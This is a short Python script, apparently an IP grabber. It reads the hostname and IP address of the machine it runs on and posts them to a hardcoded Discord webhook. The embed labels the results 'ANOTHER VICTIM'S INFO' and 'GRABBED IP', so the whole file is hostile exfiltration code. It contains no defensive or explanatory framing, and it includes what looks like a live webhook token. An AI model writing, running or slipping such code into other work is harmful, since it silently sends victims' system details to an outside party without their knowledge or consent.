import socket
from discord_webhook import DiscordWebhook, DiscordEmbed

host_name = socket.gethostname()
ip_adress = socket.gethostbyname(host_name)

content = "**ANOTHER VICTIM'S INFO:**"
webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1376947734270971944/8Eq5AZeEC2XbUuFXsxcYF3p05XA-TiO6CszOY5ZbTYT23GOJTe1hLh497nEo_qldLSD2", username="test", content=content)
embed = DiscordEmbed(title="𝙂𝙍𝘼𝘽𝘽𝙀𝘿 𝙄𝙋: " + ip_adress + " | 𝘾𝙊𝙈𝙋𝙐𝙏𝙀𝙍 𝙉𝘼𝙈𝙀 𝙊𝙁 𝙏𝙃𝙀 𝙃𝙊𝙎𝙏: " + host_name , color = 5832959)
webhook.add_embed(embed)
response = webhook.execute()
